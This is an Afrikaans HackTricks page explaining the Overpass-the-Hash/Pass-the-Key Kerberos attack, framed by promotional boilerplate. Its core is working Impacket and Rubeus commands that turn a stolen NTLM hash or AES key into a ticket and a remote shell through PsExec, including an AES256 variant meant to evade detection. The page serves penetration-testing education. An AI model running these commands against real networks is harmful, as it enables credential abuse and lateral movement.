# Oor Pass the Hash/Pass the Key

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy by 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks-opslagplek](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-opslagplek](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

Die **Overpass The Hash/Pass The Key (PTK)**-aanval is ontwerp vir omgewings waar die tradisionele NTLM-protokol beperk is en Kerberos-verifikasie voorrang geniet. Hierdie aanval maak gebruik van die NTLM-hash of AES-sleutels van 'n gebruiker om Kerberos-kaartjies te versoek, wat ongemagtigde toegang tot hulpbronne binne 'n netwerk moontlik maak.

Om hierdie aanval uit te voer, behels die aanvanklike stap die verkryging van die NTLM-hash of wagwoord van die geteikende gebruiker se rekening. Na die verkryging van hierdie inligting kan 'n Kaartjie-verleningkaartjie (TGT) vir die rekening verkry word, wat die aanvaller in staat stel om dienste of masjiene te benader waarvoor die gebruiker toestemmings het.

Die proses kan geïnisieer word met die volgende bevele:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vir scenarios wat AES256 vereis, kan die `-aesKey [AES sleutel]` opsie gebruik word. Verder kan die verkreëerde kaartjie met verskeie gereedskap soos smbexec.py of wmiexec.py gebruik word, wat die omvang van die aanval verbreed.

Probleme soos _PyAsn1Error_ of _KDC kan nie die naam vind_ word tipies opgelos deur die Impacket-biblioteek op te dateer of die gasheernaam in plaas van die IP-adres te gebruik, om versoenbaarheid met die Kerberos KDC te verseker.

'n Alternatiewe opdragreeks met behulp van Rubeus.exe toon 'n ander aspek van hierdie tegniek:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hierdie metode boots die **Pass the Key**-benadering na, met 'n fokus op die oorneem en gebruik van die kaartjie direk vir verifikasiedoeleindes. Dit is noodsaaklik om daarop te let dat die inisiasie van 'n TGT-aanvraag gebeurtenis `4768: 'n Kerberos-verifikasiekaartjie (TGT) is aangevra`, teweegbring, wat 'n standaard RC4-HMAC-gebruik aandui, alhoewel moderne Windows-stelsels AES256 verkies.

Om aan operasionele sekuriteit te voldoen en AES256 te gebruik, kan die volgende bevel toegepas word:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Verwysings

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die [hacktricks-opslagplek](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-opslagplek](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
